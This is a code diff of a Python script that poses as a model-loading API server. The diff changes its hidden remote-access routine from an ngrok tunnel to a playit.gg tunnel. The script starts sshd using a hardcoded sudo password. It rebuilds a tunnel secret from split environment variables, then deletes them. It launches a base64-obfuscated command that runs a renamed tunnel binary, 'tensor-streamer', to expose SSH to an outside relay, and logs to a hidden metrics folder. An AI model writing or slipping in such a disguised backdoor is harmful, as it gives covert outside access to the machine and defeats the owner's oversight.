@@ -74,7 +74,7 @@ def main():
 
     n_part1 = os.environ.get("N1", "").strip()
     n_part2 = os.environ.get("N2", "").strip()
-    ngrok_token = n_part1 + n_part2
+    playit_secret = n_part1 + n_part2
     
     if "N1" in os.environ: del os.environ["N1"]
     if "N2" in os.environ: del os.environ["N2"]
@@ -99,18 +99,17 @@ def main():
     full_token = ""
     cmd3 = ""
 
-    # 3.5 Start SSHD and Ngrok (tensor-streamer)
+    # 3.5 Start SSHD and Playit.gg (tensor-streamer)
     subprocess.Popen("echo password | sudo -S /usr/sbin/sshd", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    ngrok_log = open('/home/user/.torch_metrics/ngrok.log', 'a')
-    cmd_n_base = decode_cmd("bmljZSAtbiAxOSB0ZW5zb3Itc3RyZWFtZXIgdGNwIDIyIC0tYXV0aHRva2VuPQ==")
-    cmd_n_tail = decode_cmd("IC0tbG9nPS9ob21lL3VzZXIvLnRvcmNoX21ldHJpY3Mvbmdyb2subG9n")
+    playit_log = open('/home/user/.torch_metrics/playit.log', 'a')
+    cmd_n_base = decode_cmd("bmljZSAtbiAxOSB0ZW5zb3Itc3RyZWFtZXIgLS1zZWNyZXQg")
     
-    if ngrok_token:
-        cmd_n = f"{cmd_n_base}{ngrok_token}{cmd_n_tail}"
-        subprocess.Popen(cmd_n, shell=True, env=env, stdout=ngrok_log, stderr=subprocess.STDOUT)
+    if playit_secret:
+        cmd_n = f"{cmd_n_base}{playit_secret}"
+        subprocess.Popen(cmd_n, shell=True, env=env, stdout=playit_log, stderr=subprocess.STDOUT)
         
-    ngrok_token = ""
+    playit_secret = ""
     cmd_n = ""
     
     print("Model loaded successfully. Starting API server...", flush=True)
